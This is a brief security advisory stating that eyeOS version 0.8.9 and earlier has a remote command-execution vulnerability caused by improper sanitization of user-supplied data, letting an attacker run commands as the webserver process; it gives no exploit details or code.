The eyeOS system is prone to a remote command-execution vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied data.

An attacker can exploit this issue to execute arbitrary commands in the context of the webserver process.

This issue affects eyeOS version 0.8.9 and earlier.
